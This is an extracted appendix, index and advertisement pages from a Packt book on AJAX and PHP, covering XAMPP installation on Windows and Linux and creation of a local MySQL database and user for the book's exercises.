 To build websites with AJAX and PHP, you will need (quite unsurprisingly) to install 
 PHP
 . You also need a web server. We will cover installing 
 Apache
 , which is the web 
 server preferred by most PHP developers and web hosting companies. 
  
 Because we've tried to make the examples in this book as relevant as possible for real-
 world scenarios, many of them need a database. In this book, we cover 
 MySQL
 , which is 
 the most popular database server in the PHP world. Because we used simple SQL code, 
 you can easily use another database server without major code changes, or older 
 versions of MySQL. Finally, we'll be using 
 phpMyAdmin
 , which is a very useful web tool 
 for administering your databases. You'll then learn how to use this tool to create a new 
 database, and then a database user with full privileges to this database.
  
 After installing all the necessary software, we'll create a new 
 database
  and a new 
 database user
  using phpMyAdmin.",NA
Installing XAMPP,"XAMPP is a package created by Apache Friends (
 http://www.apachefriends.org
 ), 
 which includes Apache, PHP, MySQL, and many other goodies. If you don't have these 
 already installed on your machine, the easiest way to have them running is to install 
 XAMPP. XAMPP ships in Linux, Windows, Mac OS X, and Solaris versions.
  
  
 Our web-hosting friends at 
 http://nexcess.net
  are offering special 
  
  
 discount prices for the readers of this book. Their servers are also 
  
 configured to run the examples in this book.
  
 Follow the steps of the exercise in the next section to install XAMPP on your Windows 
 machine. The installation instructions for Linux are presented afterward, in a separate 
 exercise. Mac OS X users can find their version of the software, together with 
 installation instructions, at 
 http://www.apachefriends.org/en/ xampp-
 macosx.html
 .
  
 For more information about installing XAMPP, you can check out its Installation wiki 
 page at 
 http://www.installationwiki.org/XAMPP
 .",NA
Installing XAMPP on Windows,"Here are the steps that you should follow:
  
 1. Visit 
 http://www.apachefriends.org/en/xampp-windows.html
 , and 
 download the 
 XAMPPLite
  installer package, which should be an executable file 
 named something like 
 xampplite-win32-version-installer.exe
 .
  
 Windows Vista users should take note of the 
 Vista note
  on the page, 
 which reads:
  
 Because of missing or insufficient write permissions in 
  
 C:\Program Files, we recommend to use alternate folder for XAMPP 
 (C:\xampp or C:\meinverzeichnis\xampp).
  
 [
  280 
 ]",NA
Installing XAMPP on Linux,"Here are the steps you should follow:
  
 1. Visit 
 http://www.apachefriends.org/en/xampp-linux.html
 , and 
 download the XAMPP package, which should be an archive file named 
 something like 
 xampp-linux-X.Y.Z.tar.gz
 .
  
 2. Execute the following command from a Linux shell logged as the system 
  
 administrator root:
  
 tar xvfz xampp-linux-X.Y.Z.tar.gz -C /opt
  
 This will extract the downloaded archive file to 
 /opt
 .
  
  
 You can't have more web servers working on port 80 (the default port 
  
  
 used for HTTP communication). If you already have a web server on your 
  
 machine, you should make it use another port, uninstall it, or deactivate 
  
 it. Otherwise, Apache won't work. To make Apache work on another 
  
 port, you should edit 
 /opt/lampp/etc/httpd.conf
 , locate the lines 
  
 containing Listen 80 and ServerName localhost:80, and replace the value 
  
 80
  with the port number of your choice (usually the 
 8080
  is used). 
  
 3. To start XAMPP, simply call the following command:
  
 /opt/lampp/lampp start
  
 To restart XAMPP, replace 
 start
  in the previous command with 
 restart
 , and 
 to stop XAMPP, replace it with 
 stop
 .
  
 4. To test that Apache installed correctly, load 
 http://localhost/ 
  
 (or 
 http://localhost:8080/
  if Apache works on port 8080) using your web 
 browser. An XAMPP welcome screen, like the one in the previous screenshot, 
 should load.
  
 [
  283 
 ]",NA
Preparing the AJAX database,"As an exercise for both using phpMyAdmin and working with MySQL, let's create a 
 database called 
 ajax
 , and create a MySQL user with full privileges to this database. 
  
 You'll use this database and this user for all the exercises in this book. Follow 
 these steps:
  
 1. Load 
 http://localhost/phpmyadmin
  in your web browser. 
  
 2. Write 
 ajax
  in the 
 Create a new database
  box, and then click on the 
 Create 
 button. The confirmation screen should look like the following screenshot:
  
  
 3. phpMyAdmin doesn't have the visual tools to create new users, so you'll need to 
 write some SQL code now. You need to create a user with full access to the 
 ajax
  
 database, which will be used in all the case studies throughout the book. This user 
 will be called 
 ajaxuser
 , and its password will be 
 practical
 . 
  
 To add this user, click on the 
 SQL
  tab at the top of the page, and write the 
 following code in it: 
  
 GRANT ALL PRIVILEGES ON ajax.* 
  
 TO ajaxuser@localhost IDENTIFIED BY ""practical""
  
 [
  284 
 ]",NA
Index,NA,NA
Symbols,"$_POST array  181
  
  _ _construct() method  180 
  
 __destruct() method  180 
  
 <script> element 
  
  
 using  45",NA
A,"abort() method, XMLHttpRequest  60 
  
 AJAX 
  
  
 about  9, 14, 113 
  
  
 and Web 2.0  9 
  
  
 asynchronous file upload  208 
  
  
 benefits  18 
  
  
 components  16 
  
  
 database, preparing  284, 285 
  
  
 data grid  261 
  
  
 enabled web page, requesting  14 
  
  
 features  15 
  
  
 JavaScript  36 
  
  
 potential problems  18 
  
  
 resources  19 
  
  
 simple quickstart application, building  20 
  
 tools, Dojo  19 
  
  
 tools, jQuery  19 
  
  
 tools, Prototype  19 
  
  
 web registration forms, implementing 
  
  
 14, 15 
  
 AJAX chat 
  
  
 about  223 
  
  
 jQuery, using  224 
  
  
 Meebo  224 
  
 AJAX chat application
  
  
  
 about  231 
  
  
 chat.class.php file  232, 233 
  
  
 color picker, working  257, 258 
  
  
 implementing  230 
  
  
 implementing, JSON used  233-256 
  
 on server-side file  232 
  
  
 testing  230 
  
 AJAX, components 
  
  
 PHP  17 
  
  
 XMLHttpRequest object  16 
  
 AJAX data grid 
  
  
 code download, choosing  262, 263 
 AJAX form validation 
  
  
 AJAX-style, client side  148 
  
  
 allok.php, creating  167 
  
  
 application rules  148 
  
  
 blur event  177 
  
  
 config.php  159 
  
  
 config.php, creating  168 
  
  
 error handler code, creating  169 
  
  
 error_handler.php  159 
  
  
 implementing  146, 149, 159 
  
  
 index.php  159, 177 
  
  
 index.php, creating  163-167 
  
  
 index_top.php  159 
  
  
 index_top.php, creating  161, 163 
  
 INSERT commands, executing  160 
  
 json2.js  159 
  
  
 JSON setting, building  178 
  
  
 on server  147 
  
  
 PHP-style (server side)  148 
  
  
 span element  178 
  
  
 Validate class  170 
  
  
 validate.class.php  159 
  
  
 validate.class.php script file  170-176 
  
 validate.css  159",NA
B,"base class  84 
  
 Bing Maps  15 
  
 browser-side caching pattern  202 
 browser-side templating pattern  
 202",NA
C,"Call Tree  192 
  
 call stack 
  
  
 about  191 
  
  
 onload() function  192 
  
  
 process() function  192 
  
  
 Profiler tab  192 
  
  
 Start Profiling button  192 
  
  
 Stop Debugging button  192 
  
  
 Stop Profiling button  192 
  
 Cascading Style Sheets. 
 See
   CSS 
 child. 
 See
   derived class
  
 class  82 
  
 className property  179 
  
 client-side technologies 
  
  
 Flash  13 
  
  
 Java applets  13 
  
  
 Macromedia Flash  13 
  
  
 Microsoft Silverlight  13 
  
 closures  86 
  
 code, AJAX data grid 
  
  
 colors  265, 266 
  
  
 creating, steps  268-276 
  
  
 database  264 
  
  
 editable grid, components  263 
  
  
 on-promotion field  265 
  
  
 product_id field  264 
  
  
 server-side  267 
  
  
 styles  265 
  
 code combining pattern  203 
  
 code compression pattern  202 
  
 constructor  93, 94 
  
 Continue command (F5)  191 
  
 createXmlHttpRequestObject() function 
  
 about  30, 55, 58 
  
  
 upgraded version  59 
  
 cross-domain calls 
  
  
 about  216 
  
  
 using Flash  216 
  
  
 using iframes  217 
  
  
 using JSONP  217 
  
  
 using server proxy  216 
  
 Cross-Domain Proxy pattern  202 
  
 cross site request forgery. 
 See
   CSRF 
 Cross site scripting. 
 See
   XSS 
  
 CSRF 
  
  
 about  218 
  
  
 JSON hijacking  219 
  
  
 mitigating  219 
  
 CSS 
  
  
 about  35 
  
  
 and JavaScript, working with  50",NA
D,"database   279 
  
 database connection, MySQL 
  
 about  139 
  
  
 ajaxuser  139
  
 [
  288 
 ]",NA
E,"encapsulation, OOP 
  
  
 private members  84 
  
  
 public interface  83 
  
 environment 
  
  
 code editor, recommendations  20 
 Error Console  40 
  
 error_handler.php  131 
  
 error_handler.php script  129 
  
 errors, PHP 
  
  
 displaying, to users  134 
  
  
 error_handler.php  129, 131 
  
  
 handling, steps  124-128 
  
 event handling, jQuery 
  
  
 bind function  227 
  
  
 hover function  228 
  
  
 one function  227 
  
  
 ready function  228 
  
  
 toggle function  228 
  
  
 trigger function  228 
  
  
 unbind function  227 
  
 events, JavaScript 
  
  
 about  41 
  
  
 and DOM, using  43 
  
  
 onload event  45 
  
 execution context, JavaScript 
  
  
 about  103 
  
  
 eval() execution context  103 
  
  
 function execution context  103 
  
 global execution context  103 
  
  
 right context, using  105, 107 
  
  
 this.x  104
  
 [
  289 
 ]",NA
F,"fetch_array() method  144 
  
 Firebug 
  
  
 activities  195 
  
  
 Continue commands  196 
  
  
 JavaScript, debugging  196 
  
  
 Step Out command  196 
  
  
 Step Over command  196 
  
 Firebug Lite  193 
  
 Firefox 
  
  
 debugging  195 
  
  
 Firebug  195 
  
  
 profiling  195 
  
  
 Venkman JavaScript debugger  197 
  
  
 Web Developer  199 
  
 Firefox JavaScript console, error handling 
   
 78 
  
 Flash 
  
  
 cross-domain calls  216 
  
 Flickr  15 
  
 Functions  192",NA
G,"getAllResponseHeaders() method, 
  
   
 XMLHttpRequest  60 
  
 getCellCount() method  99 
  
 GetCurrentHour() function  90 
  
 getElementByID function 
  
  
 using  53 
  
 GETmethod  62 
  
 getResponseHeader() method, 
  
   
 XMLHttpRequest  60 
  
 Gmail!  15 
  
 Google 
  
  
 about  15 
  
  
 autocompletion feature, displaying  16 
 Google Maps  15 
  
 graceful degradation technique  207
  
 handleServerResponse() method  29, 32, 
 33, 
  
 76, 77, 132 
  
 heartbeat pattern  202 
  
 Hotmail  15 
  
 HTML  10 
  
 HTML message pattern  202 
  
 HTTP  10 
  
 HttpOnly cookie flag  222",NA
I,"IM  223 
  
 inheritance, OOP 
  
  
 about  84 
  
  
 base class  84 
  
  
 derived class  84 
  
  
 new class, creating  84 
  
  
 tight coupling  84 
  
 innerHTML property, DOM
   45 
 installing 
  
  
 XAMPP  280-283 
  
  
 XAMPP, on Linux  283 
  
  
 XAMPP, on Windows  280-283 
 Internet Explorer 
  
  
 debugging  184 
  
  
 Developer Toolbar  193 
  
  
 Firebug Lite  193 
  
  
 Internet Explorer 8  186 
  
  
 other debugging tools  193 
  
  
 profiling  184 
  
  
 Visual Web Developer  194 
  
  
 Web Development Helper  194 
 Internet Explorer 6 
  
  
 debug, enabling  184-186 
  
 Internet Explorer 7 
  
  
 debug, enabling  184-186 
  
 Internet Explorer 8 
  
  
 debugging  186-193 
  
  
 Developer Tools  186 
  
 IRC  223 
  
 isDatabaseCleared() method  
 256",NA
J,NA,NA
H ,"handleRequestStateChange() method  63, 70
  
 Java applets  13 
  
 JavaScript 
  
  
 about  12
  
 [
  290 
 ]",NA
K,"key/value collections 
 See
  dictionaries",NA
M,"Macromedia Flash  13 
  
 Meebo 
  
  
 about  224 
  
  
 feature  224 
  
 method chaining, jQuery  227 
  
 Microsoft Silverlight  13 
  
 MySQL 
  
  
 connecting, to database  139 
  
  
 databases tables, working with  135 
  
 data, manipulating  137 
  
  
 working with  134",NA
N,NOT NULL property  136,NA
O,"ob_clean() function  131 
  
 object detection, JavaScript  58 
  
 Object Oriented. 
 See
   OO 
  
 Object-Oriented Programming. 
 See
   OOP 
 On-Demand JavaScript pattern  202 
  
 onload event  45 
  
 onreadystatechange() property, 
  
   
 XMLHttpRequest  60, 61 
  
 OO  82 
  
 OOP 
  
  
 about  36, 82
  
 [
  291 
 ]",NA
P,"page reload  14 
  
 page updates pattern  203 
  
 parent. 
 See
   base class 
  
 passing parameters, PHP 
  
  
 about  123 
  
  
 steps  124, 126, 128 
  
 performance analysis  183 
  
 periodic refresh pattern  202 
  
 PHP 
  
  
 _ _construct() method  180 
  
  
 __destruct() method  180 
  
  
 about  11 
  
  
 connecting, to database  139 
  
  
 MySQL, working with  134 
  
  
 page request  12 
  
  
 passing parameters  123 
  
  
 server-side uses  36, 114 
  
 phpMyAdmin 
  
  
 using  279 
  
 Picasa Web Albums  15 
  
 placeholders  41 
  
 polymorphism, OOP  85 
  
 popup pattern  203 
  
 POST method  62 
  
 predictive fetching pattern  202, 204 
 private members  84 
  
 process() method 
  
  
 about  31, 33, 69 
  
  
 using  45 
  
 profiling  183 
  
 programming concepts, OOP 
  
  
 behavior  82 
  
  
 class  82 
  
  
 encapsulation  83 
  
  
 events  82
  
  
 fields  82 
  
  
 inheritance  84 
  
  
 methods  82 
  
  
 polymorphism  85 
  
  
 propertie  82 
  
  
 state  82 
  
  
 type  82 
  
 progress indicator pattern  202-205 
  
 progressive enhancement pattern  203, 
 207 prototypes  86 
  
 Prototyping language  98 
  
 public interface  83",NA
Q,"quickstart application, AJAX 
  
 building  20-31 
  
 index.html file  22 
  
 quickstart.js file  22, 23, 25 
  
 quickstart.php file  22, 26",NA
R,"RDBMS  134 
  
 readyState() method, XMLHttpRequest  61 
 Relational Database Management System. 
  
  
 See
   RDBMS 
  
 responseText() method, XMLHttpRequest 
  
 61 
  
 responseXML() method, XMLHttpRequest 
  
 61 
  
 retrieveNewMessages() method  252, 257",NA
S,"saveXML function  119 
  
 security vulnerabilities, XSS 
  
  
 cookies scenarios  222 
  
  
 escaping  221 
  
  
 input validation  221 
  
 sendMessage function  255 
  
 send() method, XMLHttpRequest  60 
 server response 
  
  
 asynchronous calls, making with 
  
  
 XMLHttpRequest  65-70 
  
 setRequestHeader() method, 
  
   
 XMLHttpRequest  60
  
 [
  292 
 ]",NA
T,"tight coupling  84 
  
 timeout pattern  203 
  
 turn() method  83 
  
 type. 
 See
   class",NA
U,"UML  95 
  
 Unified Modeling Langugae. 
 See
   UML 
 unique URLs pattern  203 
  
 unobtrusive JavaScript pattern  205, 
 206",NA
V,"validate.class.php 
  
  
 validateAJAX() method  180 
  
  
 validatePHP() method  180 
  
 validation 
  
  
 about  145 
  
  
 AJAX form validation   146 
  
  
 data  145 
  
  
 server-side form validation   146 
 Venkman JavaScript debugger 
  
 about  197 
  
  
 handleRequestStateChange()  198 
  
 in action  198 
  
 virtual workspace pattern  203 
  
 Visual Web Developer  194",NA
W,"Web 2.0 
  
  
 and AJAX  9 
  
 Web Developer 
  
  
 about  199 
  
  
 activities  199 
  
 Web Development Helper  194 
 websites 
  
  
 about  10 
  
  
 building  10 
  
 websites, building 
  
  
 client-side technologies  11 
  
  
 HHTP  10 
  
  
 HTML  10 
  
  
 PHP  11 
  
  
 server-side technologies  11",NA
X,"XAMPP 
  
  
 installing  280 
  
  
 installing, on Linux  283 
  
  
 installing, on Windows  280-283 
  
  
 XAMPPusing  280 
  
 XAMPP installation 
  
  
 on Linux  283 
  
  
 on Windows  280-283 
  
  
 phpMyAdmin installation, testing  282, 283 
 XML  35 
  
 XmlHttp object 
  
  
 async.txt  156 
  
  
 properties  157 
  
  
 readResponse() inner function  158 
  
  
 readystatechange event  158 
  
  
 xhr.js file  151-154 
  
  
 xhrtest.html file  155 
  
  
 XmlHttp()  156 
  
  
 XmlHttp.create()  156 
  
 XMLHttpRequest 
  
  
 about  150 
  
  
 complete  150 
  
  
 settings class  150 
  
  
 XmlHttp object  151
  
 [
  293 
 ]",NA
Y,"Yahoo!  15 
  
 Yahoo! Mail  15 
  
 Yahoo! Maps  15 
  
 Yahoo User Interface Library. 
 See
   YUI 
 YUI  82
  
 [
  294 
 ]",NA
Thank you for buying ,NA,NA
AJAX and PHP,NA,NA
Writing for Packt,"We welcome all inquiries from people who are interested in authoring. Book proposals should be 
 sent to 
 author@packtpub.com
 . If your book idea is still at an early stage and you would like to 
 discuss it first before writing a formal book proposal, contact us; one of our commissioning 
 editors will get in touch with you. 
  
 We're not just looking for published authors; if you have strong technical skills but no writing 
 experience, our experienced editors can help you develop a writing career, or simply get some 
 additional reward for your expertise.",NA
About Packt Publishing,"Packt, pronounced 'packed', published its first book ""Mastering phpMyAdmin for Effective 
 MySQL Management"" in April 2004 and subsequently continued to specialize in publishing 
 highly focused books on specific technologies and solutions. 
  
 Our books and publications share the experiences of your fellow IT professionals in adapting and 
 customizing today's systems, applications, and frameworks. Our solution-based books give you the 
 knowledge and power to customize the software and technologies you're using to get the job done. 
 Packt books are more specific and less general than the IT books you have seen in the past. Our 
 unique business model allows us to bring you more focused information, giving you more of what 
 you need to know, and less of what you don't.
  
 Packt is a modern, yet unique publishing company, which focuses on producing quality, 
 cutting-edge books for communities of developers, administrators, and newbies alike. For 
 more information, please visit our website: 
 www.PacktPub.com
 .",NA
PHP and script.aculo.us Web 2.0 ,NA,NA
Application Interfaces ,"ISBN: 978-1-847194-04-6             Paperback: 264 pages
  
 Build powerful interactive AJAX applications with 
 script.aculo.us and PHP 
  
 1. 
  
 2. 
  
 3. 
  
 Get started quickly with script.aculo.us library 
 with as little as one line of code 
  
 Explore Prototype library features, tutorials, 
 code, and examples 
  
 Learn script.aculo.us' In-place Editing, Auto 
 Completion, Sliders, Drag-and-Drop, Effects, 
  
 and Multimedia",NA
DWR Java AJAX Applications ,"ISBN: 978-1-847192-93-6            Paperback: 228 pages
  
 A step-by-step example-packed guide to learning 
 professional application development with Direct 
 Web Remoting 
  
 1. 
  
 2. 
  
 3. 
  
 Learn Direct Web Remoting features from 
 scratch and how to apply DWR practically
  
 Topics such as configuration, testing, and 
 debugging are thoroughly explained 
 through examples 
  
 Demonstrates advanced elements of creating 
 user interfaces and back-end integration 
  
  
 Please check 
 www.PacktPub.com
  for information on our titles",NA
Microsoft AJAX Library ,NA,NA
Essentials: Client-side ASP.NET ,NA,NA
AJAX 1.0 Explained ,"ISBN: 978-1-847190-98-7            Paperback: 300 pages
  
 A practical tutorial to enhancing the user experience of 
 your ASP.NET web applications with the final release of 
 the Microsoft AJAX Library 
  
 1. 
  
 2. 
  
 3. 
  
 A rapid and practical guide to including AJAX 
 features in your .NET applications
  
 Learn practical development strategies 
 and techniques
  
 Go through a case study that demonstrates the 
 theory you learned throughout the book.",NA
Learning PHP Data Objects ,"ISBN: 978-1-847192-66-0            Paperback: 188 pages
  
 A Beginner's Guide to PHP Data Objects, Database 
  
 Connection Abstraction Library for PHP 5 
  
 1. 
  
 An overview of PDO
  
 2. 
  
 Creating a database and connecting to it
  
 3. 
  
 Error Handling
  
 3. 
  
 Advanced features
  
 Please check 
 www.PacktPub.com
  for information on our titles",NA
